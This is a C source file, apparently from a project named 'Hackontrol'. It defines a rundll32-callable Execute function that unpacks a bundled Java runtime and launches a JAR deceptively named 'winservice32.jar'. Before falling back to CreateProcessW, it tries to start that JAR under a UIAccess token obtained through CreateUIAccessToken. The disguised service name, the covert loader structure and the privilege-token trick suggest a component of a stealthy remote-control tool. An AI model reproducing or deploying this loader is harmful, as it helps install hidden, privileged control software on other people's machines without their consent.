#include <khopanwin32.h>
#include <khopanstring.h>
#include <hackontrol.h>
#include "execute.h"

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FILE_JAVA         L"javaw.exe"
#define FILE_WINSERVICE32 L"winservice32.jar"
#define FOLDER_BIN        L"bin"
#define FOLDER_JAVA       L"AdditionalData"

static void executeJarFile(LPCWSTR const pathFileJavaw, LPWSTR const argumentFileJavaw, LPCWSTR const currentDirectory);

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);

	if(!pathFolderHackontrol) {
		KHWin32DialogErrorW(GetLastError(), L"HackontrolGetDirectory");
		return;
	}

	LPSTR pathFolderJava = KHFormatMessageA("%ws\\%ws", pathFolderHackontrol, FOLDER_JAVA);

	if(!pathFolderJava) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freePathFolderHackontrol;
	}

	LPWSTR pathFileWinservice32 = KHFormatMessageW(L"%ws\\" FILE_WINSERVICE32, pathFolderHackontrol);

	if(!pathFileWinservice32) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(pathFolderJava);
		goto freePathFolderHackontrol;
	}

	if(!CreateDirectoryA(pathFolderJava, NULL)) {
		DWORD error = GetLastError();

		if(error != ERROR_ALREADY_EXISTS) {
			KHWin32DialogErrorW(error, L"KHFormatMessageW");
			FREE(pathFileWinservice32);
			FREE(pathFolderJava);
			goto freePathFolderHackontrol;
		}
	}

	BOOL result = ExtractJRE(pathFolderJava);

	if(result) {
		FREE(pathFileWinservice32);
		FREE(pathFolderJava);
		goto freePathFolderHackontrol;
	}

	LPWSTR pathFileJava = KHFormatMessageW(L"%S\\" FOLDER_BIN L"\\" FILE_JAVA, pathFolderJava);
	FREE(pathFolderJava);

	if(!pathFileJava) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(pathFileWinservice32);
		goto freePathFolderHackontrol;
	}

	LPWSTR argumentFileJava = KHFormatMessageW(L"%ws -jar \"%ws\" \"%ws\"", pathFileJava, pathFileWinservice32, pathFolderHackontrol);
	FREE(pathFileWinservice32);

	if(!argumentFileJava) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(pathFileJava);
		goto freePathFolderHackontrol;
	}

	executeJarFile(pathFileJava, argumentFileJava, pathFolderHackontrol);
	FREE(argumentFileJava);
	FREE(pathFileJava);
freePathFolderHackontrol:
	FREE(pathFolderHackontrol);
}

static BOOL tryStartWithUIAccess(LPCWSTR const pathFileJava, LPWSTR const argumentFileJava, LPCWSTR const currentDirectory) {
	HANDLE accessToken;

	if(!CreateUIAccessToken(&accessToken)) {
		return FALSE;
	}

	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(startupInformation);
	PROCESS_INFORMATION processInformation;

	if(!CreateProcessAsUserW(accessToken, pathFileJava, argumentFileJava, NULL, NULL, FALSE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, currentDirectory, &startupInformation, &processInformation)) {
		return FALSE;
	}

	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
	return TRUE;
}

static void executeJarFile(LPCWSTR const pathFileJava, LPWSTR const argumentFileJava, LPCWSTR const currentDirectory) {
	if(tryStartWithUIAccess(pathFileJava, argumentFileJava, currentDirectory)) {
		return;
	}

	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(startupInformation);
	PROCESS_INFORMATION processInformation;

	if(!CreateProcessW(pathFileJava, argumentFileJava, NULL, NULL, TRUE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, currentDirectory, &startupInformation, &processInformation)) {
		KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
		return;
	}

	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
}
